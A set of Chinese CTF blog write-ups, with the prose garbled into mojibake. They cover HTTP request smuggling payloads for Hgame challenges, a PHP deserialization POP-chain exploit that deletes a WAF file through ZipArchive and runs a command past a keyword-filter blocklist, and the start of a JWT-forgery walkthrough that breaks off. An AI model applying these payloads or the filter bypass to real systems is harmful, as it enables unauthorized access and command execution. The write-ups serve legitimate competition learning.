<h3 id="åœ¨httpè¯·æ±‚ä¸­å­˜åœ¨CLå’ŒTE-Transfer-Encoding-ï¼Œå‰ç«¯åªå¤„ç†çš„æ˜¯CLï¼Œåç«¯åªå¤„ç†TEï¼ˆCL-TEï¼‰"><a href="#åœ¨httpè¯·æ±‚ä¸­å­˜åœ¨CLå’ŒTE-Transfer-Encoding-ï¼Œå‰ç«¯åªå¤„ç†çš„æ˜¯CLï¼Œåç«¯åªå¤„ç†TEï¼ˆCL-TEï¼‰" class="headerlink" title="åœ¨httpè¯·æ±‚ä¸­å­˜åœ¨CLå’ŒTE(Transfer-Encoding)ï¼Œå‰ç«¯åªå¤„ç†çš„æ˜¯CLï¼Œåç«¯åªå¤„ç†TEï¼ˆCL-TEï¼‰"></a>åœ¨httpè¯·æ±‚ä¸­å­˜åœ¨CLå’ŒTE(Transfer-Encoding)ï¼Œå‰ç«¯åªå¤„ç†çš„æ˜¯CLï¼Œåç«¯åªå¤„ç†TEï¼ˆCL-TEï¼‰</h3><p>åœ¨<code>Transfer-Encoding: chunked</code>ä¸‹æ•°æ®æ ¼å¼æ˜¯è¿™æ ·çš„</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[chunk size][\r\n][chunk data][\r\n][chunk size][\r\n][chunk data][\r\n][chunk size &#x3D; 0][\r\n][\r\n]</span><br></pre></td></tr></table></figure>

<p>åˆ†å—å¤§å°çš„å€¼åœ¨å‰ï¼Œåé¢æ˜¯åˆ†å—æ•°æ®ã€‚å½“åˆ°å°¾éƒ¨æ—¶ï¼Œåˆ†å—å¤§å°çš„å€¼ä¸º0ï¼Œç„¶åä»¥<code>\r\n\r\n</code>ç»“æŸ</p>
<p><a href="http://shifeng-kaze.cn/blog/hgame2021_web_wp/0b37e16790f1a6bfa7d1cd5c27c7c263.png"><img src="http%E8%B5%B0%E7%A7%81/0b37e16790f1a6bfa7d1cd5c27c7c263.png" alt="img"></a></p>
<p>åƒè¿™æ ·çš„ä¸€ä¸ªè¯·æ±‚ï¼Œå‰ç«¯å¤„ç†CLåè®¤ä¸ºè¯·æ±‚ä½“ä¸º6ï¼ŒåŒ…æ‹¬<code>0\r\n\r\nG</code>ã€‚è€Œåç«¯å¤„ç†TEåï¼Œæ£€æµ‹åˆ°<code>0\r\n\r\n</code>å°±è®¤ä¸ºè¿™ä¸ªè¯·æ±‚å·²ç»ç»“æŸäº†ï¼Œ<code>G</code>å°±è¿›å…¥äº†ç¼“å†²åŒºã€‚ç»“æœå°±æ˜¯å†å‘é€ä¸€ä¸ªæ­£å¸¸çš„POSTè¯·æ±‚è¿›æ¥ï¼Œå°±ä¼šå‡ºç°æ²¡æœ‰<code>GPOST</code>è¯·æ±‚çš„é”™è¯¯</p>
<h3 id="å‰ç«¯åªå¤„ç†TEï¼Œåç«¯åªå¤„ç†CLï¼ˆTE-CLï¼‰"><a href="#å‰ç«¯åªå¤„ç†TEï¼Œåç«¯åªå¤„ç†CLï¼ˆTE-CLï¼‰" class="headerlink" title="å‰ç«¯åªå¤„ç†TEï¼Œåç«¯åªå¤„ç†CLï¼ˆTE-CLï¼‰"></a>å‰ç«¯åªå¤„ç†TEï¼Œåç«¯åªå¤„ç†CLï¼ˆTE-CLï¼‰</h3><p><a href="http://shifeng-kaze.cn/blog/hgame2021_web_wp/6799a8f91dc52f6aa355219bb90435aa.png"><img src="http%E8%B5%B0%E7%A7%81/6799a8f91dc52f6aa355219bb90435aa.png" alt="img"></a></p>
<p>åƒè¿™ä¸ªè¯·æ±‚ï¼Œå‰ç«¯æ¥å—åæ£€æµ‹åˆ°<code>0\r\n\r\n</code>åæ‰è®¤ä¸ºè¯·æ±‚ç»“æŸï¼Œäºæ˜¯å°±æŠŠ<code>12\r\nGPOST / HTTP/1.1\r\n\r\n0\r\n\r\n</code>è®¤ä¸ºæ˜¯å±äºè¯·æ±‚ä½“çš„ã€‚è€Œåç«¯æ ¹æ®CLå€¼ï¼Œè®¤ä¸º<code>12\r\n</code>è¯·æ±‚å°±ç»“æŸäº†ï¼Œäºæ˜¯è¿ç»­è®¿é—®åå°±ä¼šå‡ºç°æ²¡æœ‰<code>GPOST</code>è¯·æ±‚çš„é”™è¯¯</p>
<h3 id="å‰åç«¯éƒ½å¤„ç†TE"><a href="#å‰åç«¯éƒ½å¤„ç†TE" class="headerlink" title="å‰åç«¯éƒ½å¤„ç†TE"></a>å‰åç«¯éƒ½å¤„ç†TE</h3><p>è¿™æ—¶è™½ç„¶å¤„ç†ç›¸åŒäº†ï¼Œä½†æˆ‘ä»¬å¯ä»¥é€šè¿‡å¯¹TEè¿›è¡Œæ··æ·†ï¼Œä½¿å¾—å…¶ä¸­ä¸€ä¸ªæœåŠ¡å™¨ä¸å¤„ç†TEï¼Œç»“æœé€ æˆ<code>TE-CL</code>/<code>CL-TE</code>çš„httpèµ°ç§</p>
<p><a href="http://shifeng-kaze.cn/blog/hgame2021_web_wp/083cea019b778569ca28f634d3e4c46d.png"><img src="http%E8%B5%B0%E7%A7%81/083cea019b778569ca28f634d3e4c46d.png" alt="img"></a></p>
<p>åƒè¿™ä¸ªè¯·æ±‚ï¼Œå°è¯•ç”¨ä¸¤ä¸ªTEå»æ··æ·†ï¼Œä½¿å¾—åç«¯æœåŠ¡å™¨ä¸å¤„ç†TEåªå¤„ç†CLï¼Œé€ æˆ<code>TE-CL</code>çš„httpèµ°ç§</p>
<p>æ¥è‡ªåšå®¢ï¼š<a href="http://www.shifeng-kaze.cn/index.php/archives/132/#%EF%BC%8C%E5%86%99%E7%9A%84%E7%9C%9F%E5%A5%BD%EF%BC%8C%E8%BF%99%E9%87%8C%E5%8F%AA%E5%81%9A%E8%87%AA%E5%B7%B1%E7%9A%84%E7%BA%AA%E5%BF%B5">http://www.shifeng-kaze.cn/index.php/archives/132/#ï¼Œå†™çš„çœŸå¥½ï¼Œè¿™é‡Œåªåšè‡ªå·±çš„çºªå¿µ</a></p>
<p>Hgameä¸¤é“é¢˜çš„Payloadï¼š</p>
<p>ç¬¬ä¸€é¢˜ï¼š</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: thief.0727.site</span><br><span class="line"><span class="attribute">Content-Length</span>: 77</span><br><span class="line"><span class="attribute">Transfer-Encoding</span>: chunked</span><br><span class="line"></span><br><span class="line"><span class="attribute">0</span></span><br><span class="line"><span class="attribute"></span></span><br><span class="line">GET /secret  HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: thief.0727.site</span><br><span class="line"><span class="attribute">Client-IP:127.0.0.1</span></span><br><span class="line"><span class="attribute">aa:bn</span></span><br></pre></td></tr></table></figure>





<p>ç¬¬äºŒé¢˜ï¼š</p>
<p>è¿™é¢˜ç›®å’Œç¬¬ä¸€é¢˜æ˜¯å·®ä¸å¤šä¸€æ ·çš„ï¼Œåªä¸è¿‡æ˜¯ä½œè€…ä¸ºäº†é˜²æ­¢è¹­è½¦è®¾ç½®äº†éšœç¢ï¼Œä½ å¾—çˆ†ç ´</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: police.liki.link</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.146 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Content-Length</span>: 77</span><br><span class="line"><span class="attribute">Transfer-Encoding</span>: chunked</span><br><span class="line"></span><br><span class="line"><span class="attribute">0</span></span><br><span class="line"><span class="attribute"></span></span><br><span class="line">GET /secret  HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: thief.0727.site</span><br><span class="line"><span class="attribute">Client-IP:127.0.0.1</span></span><br><span class="line"><span class="attribute">aa:bn</span></span><br><span class="line"><span class="attribute"></span></span><br><span class="line"><span class="attribute"></span></span><br></pre></td></tr></table></figure>

<p>(æœ€åä¸¤è¡Œçš„æ¢è¡Œç¬¦æ˜¯å¿…éœ€å“)</p>
]]></content>
  </entry>
  <entry>
    <title>nepctf_æ¢¦é‡ŒèŠ±å¼€ç‰¡ä¸¹äº­</title>
    <url>/2021/03/22/nepctf-%E6%A2%A6%E9%87%8C%E8%8A%B1%E5%BC%80%E7%89%A1%E4%B8%B9%E4%BA%AD/</url>
    <content><![CDATA[<p>ä¸€é“è€ƒç‚¹æ¯”è¾ƒæœ‰è¶£çš„é¢˜ç›®ï¼Œè™½ç„¶ä¸éš¾è€Œä¸”æœ‰ç‚¹ç»•ï¼Œä½†æ˜¯æ„Ÿè§‰æ€è·¯è¿˜æ˜¯å¾ˆç²¾å¦™çš„ï¼</p>
<p>é¦–å…ˆæ‰“å¼€é¢˜ç›®å¯ä»¥çœ‹åˆ°æºç ï¼š</p>
<h1 id="è¯»å–shell-php"><a href="#è¯»å–shell-php" class="headerlink" title="è¯»å–shell.php"></a>è¯»å–shell.php</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;shell.php&#x27;</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Game</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span>  $username;</span><br><span class="line">    <span class="keyword">public</span>  $password;</span><br><span class="line">    <span class="keyword">public</span>  $choice;</span><br><span class="line">    <span class="keyword">public</span>  $register;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span>  $file;</span><br><span class="line">    <span class="keyword">public</span>  $filename;</span><br><span class="line">    <span class="keyword">public</span>  $content;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(md5(<span class="keyword">$this</span>-&gt;register)===<span class="string">&quot;21232f297a57a5a743894a0e4a801fc3&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;choice=<span class="keyword">new</span> login(<span class="keyword">$this</span>-&gt;file,<span class="keyword">$this</span>-&gt;filename,<span class="keyword">$this</span>-&gt;content);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;choice = <span class="keyword">new</span> register();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;choice-&gt;checking(<span class="keyword">$this</span>-&gt;username,<span class="keyword">$this</span>-&gt;password);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">login</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line">    <span class="keyword">public</span> $content;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$file,$filename,$content</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file=$file;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename=$filename;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content=$content;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checking</span>(<span class="params">$username,$password</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>($username===<span class="string">&#x27;admin&#x27;</span>&amp;&amp;$password===<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;file-&gt;open(<span class="keyword">$this</span>-&gt;filename,<span class="keyword">$this</span>-&gt;content);</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;login success you can to open shell file!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">register</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checking</span>(<span class="params">$username,$password</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>($username===<span class="string">&#x27;admin&#x27;</span>&amp;&amp;$password===<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;success register admin&#x27;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;please register admin &#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Open</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">open</span>(<span class="params">$filename, $content</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!file_get_contents(<span class="string">&#x27;waf.txt&#x27;</span>))&#123;</span><br><span class="line">            shell($content);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> file_get_contents($filename.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">&#x27;a&#x27;</span>]!==$_GET[<span class="string">&#x27;b&#x27;</span>]&amp;&amp;(md5($_GET[<span class="string">&#x27;a&#x27;</span>]) === md5($_GET[<span class="string">&#x27;b&#x27;</span>])) &amp;&amp; (sha1($_GET[<span class="string">&#x27;a&#x27;</span>])=== sha1($_GET[<span class="string">&#x27;b&#x27;</span>])))&#123;</span><br><span class="line">    @unserialize(base64_decode($_POST[<span class="string">&#x27;unser&#x27;</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬çš„æœ€ç»ˆç›®çš„æ˜¯è¯»å–æ–‡ä»¶ï¼Œæ‰€ä»¥éœ€è¦åˆ©ç”¨åˆ°é¢˜ç›®ä¸­ç»™åˆ°çš„Openç±»ä¸­çš„openå‡½æ•°ï¼ŒæŸ¥çœ‹å“ªé‡Œä½¿ç”¨openå‡½æ•°ï¼Œè¯¥é¢˜æ€è·¯æ¯”è¾ƒç®€å•ï¼Œå°±æ˜¯</p>
<p>open-&gt;login-&gt;game è¿™ä¸‰ä¸ªç±»</p>
<p>é¦–å…ˆç¬¬ä¸€æ­¥çš„ç»•è¿‡ç›´æ¥ç”¨æ•°ç»„ç»•è¿‡å³å¯ï¼Œè¿™ä¸ªç®€å•ï¼Œé‡ç‚¹æ˜¯ååºåˆ—åŒ–æˆ‘ä»¬ï¼ŒæŸ¥POPé“¾ï¼Œä¸€å¼€å§‹æˆ‘ä»¥ä¸ºæ˜¯ç»•è¿‡wakeupå‡½æ•°ï¼Œåæ¥å‘ç°æ²¡æ³•ç»•äº†ï¼ˆ7.0+ç‰ˆæœ¬å·²æ¶ˆé™¤äº†è¯¥é—®é¢˜ï¼‰ï¼Œæµªè´¹äº†è›®å¤šæ—¶é—´çš„ï¼Œä½†æ˜¯ä¹Ÿæ²¡å•¥å…³ç³»ï¼Œæˆ‘ä»¬ç›´æ¥èµ°wakeupå‡ºå‘</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(md5(<span class="keyword">$this</span>-&gt;register)===<span class="string">&quot;21232f297a57a5a743894a0e4a801fc3&quot;</span>)&#123;</span><br><span class="line"><span class="comment">//            echo $this-&gt;content;</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;choice=<span class="keyword">new</span> login(<span class="keyword">$this</span>-&gt;file,<span class="keyword">$this</span>-&gt;filename,<span class="keyword">$this</span>-&gt;content);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;choice = <span class="keyword">new</span> register();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>çœ‹åˆ°è¿™é‡Œä¼šå…ˆçœ‹æˆ‘ä»¬çš„regiterçš„md5å€¼,md5ç¿»è¯‘å‡ºæ¥å°±æ˜¯adminï¼ŒæˆåŠŸçš„è¯å°±ä¼šè°ƒç”¨loginï¼Œå¤±è´¥äº†å°±ä¼šå»registerï¼Œä½†æ˜¯registeræ²¡å•¥ç”¨ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦ä¿è¯èƒ½è¿›å…¥loginå½“ä¸­ï¼Œæ•…ç¬¬ä¸€æ­¥çš„payloadï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$a=<span class="keyword">new</span> Game();</span><br><span class="line">$a-&gt;register=<span class="string">&#x27;admin&#x27;</span></span><br></pre></td></tr></table></figure>

<p>æ¥ä¸‹æ¥çœ‹loginå‡½æ•°ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">login</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line">    <span class="keyword">public</span> $content;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$file,$filename,$content</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file=$file;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename=$filename;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content=$content;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checking</span>(<span class="params">$username,$password</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>($username===<span class="string">&#x27;admin&#x27;</span>&amp;&amp;$password===<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;file-&gt;open(<span class="keyword">$this</span>-&gt;filename,<span class="keyword">$this</span>-&gt;content);</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;login success you can to open shell file!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å‘ç°loginå‡½æ•°çš„checkingå‡½æ•°ä¼šå¯¹ç”¨æˆ·åå’Œå¯†ç è¿›è¡Œæ£€æŸ¥ï¼Œæ£€æŸ¥è¿‡åå°±ä¼šè°ƒç”¨this-&gt;fileçš„openå‡½æ•°ï¼Œæ•…æˆ‘ä»¬éœ€è¦æ„å»ºï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$a-&gt;username=<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">$a-&gt;password=<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">$c = <span class="keyword">new</span> Open();</span><br><span class="line">$a-&gt;file = $c;</span><br></pre></td></tr></table></figure>

<p>å†çœ‹Openå‡½æ•°åšäº†ä»€ä¹ˆ</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Open</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">open</span>(<span class="params">$filename, $content</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!file_get_contents(<span class="string">&#x27;waf.txt&#x27;</span>))&#123;</span><br><span class="line">            shell($content);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> file_get_contents($filename.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å‘ç°å½“æ²¡æœ‰waf.txtçš„æ—¶å€™ä¾¿ä¼šæ‰§è¡Œshellå‡½æ•°ï¼šä½†æ˜¯å½“å‰æˆ‘ä»¬ä¸çŸ¥é“shell.phpçš„ç”¨æ³•ï¼Œå¦‚æœæœ‰waf.txtåˆ™ä¼šè¯»å–æ–‡ä»¶ï¼Œç›®å‰æˆ‘ä»¬æ˜¯æœ‰waf.txtçš„ï¼Œæ‰€ä»¥å¯ä»¥è¯»å–æ–‡ä»¶ï¼Œé‚£ä¹ˆæ¥ç€æ„é€ payload:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$a-&gt;filename = <span class="string">&#x27;shell&#x27;</span></span><br></pre></td></tr></table></figure>

<p>è¿™æ ·å°±å¯ä»¥è¯»å–åˆ°æ–‡ä»¶shell.php</p>
<p><img src="image-20210322110750049.png" alt="image-20210322110750049"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">shell</span>(<span class="params">$cmd</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(strlen($cmd)&lt;<span class="number">10</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/cat|tac|more|less|head|tail|nl|tail|sort|od|base|awk|cut|grep|uniq|string|sed|rev|zip|\*|\?/&#x27;</span>,$cmd))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;NO&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> system($cmd);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;so long!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åˆ°è¿™å°±å‚»çœ¼äº†ï¼Œè™½ç„¶è¿™ä¸ªç»•è¿‡ä¸éš¾ï¼Œä½†æ˜¯æˆ‘è¯¥æ€ä¹ˆè°ƒç”¨shellå‡½æ•°å‘¢ï¼Ÿè¿™æ—¶å†å›å¤´çœ‹ï¼Œå‘ç°openå‡½æ•°å¦‚æœæ²¡æœ‰æ‰¾åˆ°waf.txtçš„è¯å°±ä¼šè°ƒç”¨ã€‚ã€‚è¿™å°±å‚»çœ¼äº†ï¼Œè¿™æ€ä¹ˆå¯èƒ½å¯ä»¥ï¼Ÿ</p>
<h1 id="åˆ é™¤waf-txt"><a href="#åˆ é™¤waf-txt" class="headerlink" title="åˆ é™¤waf.txt"></a>åˆ é™¤waf.txt</h1><p>è¿™æ—¶å€™å°±è¦é‡æ–°å›é¡¾é¢˜ç›®äº†ï¼Œé¢˜ç›®è°ƒç”¨åˆ°äº†openå‡½æ•°ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥çŒœæƒ³openå‡½æ•°éš¾é“åªèƒ½ç”¨å½“å‰é¢˜ç›®çš„Openç±»å—ï¼Ÿæ˜¯ä¸æ˜¯æœ‰å…¶ä»–å†…ç½®ç±»ä¹Ÿæœ‰åŒåå‡½æ•°å‘¢ã€‚æ‰€ä»¥ä¸Šphpå®˜ç½‘å»æŸ¥æ‰¾äº†ä¸€ç•ªï¼Œæœç„¶æœ€ç»ˆæ‰¾åˆ°</p>
<p><img src="image-20210322110328291.png" alt="image-20210322110328291"></p>
<p><img src="image-20210322110418083.png" alt="image-20210322110418083"></p>
<p>é‚£ä¹ˆè¿™æ ·å°±å¯ä»¥è§£å†³äº†ï¼Œæ„é€ payloadï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$a-&gt;file=<span class="keyword">new</span> ZipArchive;</span><br><span class="line">$a-&gt;filename=<span class="string">&#x27;waf.txt&#x27;</span>;</span><br><span class="line">$a-&gt;content = ZipArchive::OVERWRITE</span><br></pre></td></tr></table></figure>

<p>è¿™æ ·å°±å¯ä»¥åˆ é™¤æ‰æ–‡ä»¶</p>
<h1 id="ç»•è¿‡è¿‡æ»¤"><a href="#ç»•è¿‡è¿‡æ»¤" class="headerlink" title="ç»•è¿‡è¿‡æ»¤"></a>ç»•è¿‡è¿‡æ»¤</h1><p>è¿™ä¸ªå°±æ˜¯æœ€ç®€å•çš„ä¸€éƒ¨äº†ï¼Œç›´æ¥php  /flag å³å¯ï¼Œæœ€ç»ˆpayloadï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$a&#x3D;new Game();</span><br><span class="line">$a-&gt;username&#x3D;&#39;admin&#39;;</span><br><span class="line">$a-&gt;password&#x3D;&#39;admin&#39;;</span><br><span class="line"></span><br><span class="line">$c&#x3D;new Open();</span><br><span class="line">$a-&gt;file&#x3D;$c;</span><br><span class="line">&#x2F;&#x2F;$c&#x3D;new Open();</span><br><span class="line">&#x2F;&#x2F;$a-&gt;file&#x3D;new ZipArchive;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;$a-&gt;content&#x3D;&#39;php &#x2F;flag&#39;;</span><br><span class="line">&#x2F;&#x2F;$a-&gt;content&#x3D;ZipArchive::OVERWRITE;</span><br><span class="line">&#x2F;&#x2F;$a-&gt;content&#x3D;&#39;php &#x2F;flag&#39;;</span><br><span class="line">$a-&gt;content&#x3D;&#39;php &#x2F;flag&#39;;</span><br><span class="line">$a-&gt;filename&#x3D;&quot;waf.txt&quot;;</span><br><span class="line"></span><br><span class="line">$s&#x3D; (serialize($a));</span><br><span class="line">echo base64_encode($s);</span><br><span class="line">unserialize($s);</span><br></pre></td></tr></table></figure>

<p><img src="image-20210322110955960.png" alt="image-20210322110955960"></p>
<p>æ€»ç»“ï¼š</p>
<p>æ„Ÿè§‰è¿™é¢˜ç›®çš„æ€è·¯æŒºå¥½çš„ï¼Œåˆ©ç”¨åˆ°äº†å†…ç½®ç±»çš„çŸ¥è¯†ï¼Œç›¸å½“æœ‰è¶£~ï¼ˆè™½ç„¶åšçš„æ—¶å€™å‘—ç»•æ¥ç»•å»</p>
]]></content>
      <tags>
        <tag>ååºåˆ—åŒ–</tag>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>ikun</title>
    <url>/2020/12/06/ikun/</url>
    <content><![CDATA[<h1 id="è€ƒç‚¹"><a href="#è€ƒç‚¹" class="headerlink" title="è€ƒç‚¹"></a>è€ƒç‚¹</h1><ol>
<li>Pythoné€»è¾‘æ¼æ´</li>
<li>JWTä¼ªé€ </li>
</ol>
<h1 id="è¿‡ç¨‹"><a href="#è¿‡ç¨‹" class="headerlink" title="è¿‡ç¨‹"></a>è¿‡ç¨‹</h1><p>ç¬¬ä¸€æ­¥ï¼Œæˆ‘ä»¬çˆ†ç ´æ‰¾åˆ°LV6è´¦å·ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">999</span>):</span><br><span class="line">    url = <span class="string">&quot;http://25bf3014-fd74-4f4e-882b-5b310346732e.node3.buuoj.cn/shop?page=&#123;&#125;&quot;</span>.<span class="built_in">format</span>(i)</span><br><span class="line">    res = requests.get(url)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;lv6.png&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">        print(i)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è´­ä¹°çš„æ—¶å€™å¤šç‚¹å‡ ä¸‹è§¦å‘æ‰“æŠ˜ï¼Œç„¶åæˆ‘ä»¬æ‰‹åŠ¨æŠŠæŠ˜æ‰£æ”¹çš„ç‰¹åˆ«ä½</p>
<p><img src="image-20201206194646805.png" alt="image-20201206194646805"></p>
<p>å¾—åˆ°urlï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">b1g_m4mber</span><br></pre></td></tr></table></figure>

<p>éœ€è¦æˆ‘ä»¬ç”¨adminç™»é™†ï¼Œçœ‹çœ‹è‡ªå·±çš„æƒ…å†µï¼Œå¤§æ¦‚åªèƒ½ç”¨JWTä¼ªé€ äº†ï¼Œæ²¡æœ‰å¯†é’¥ä¸¢è¿›å»çˆ†ç ´å¥½äº†ï¼š</p>
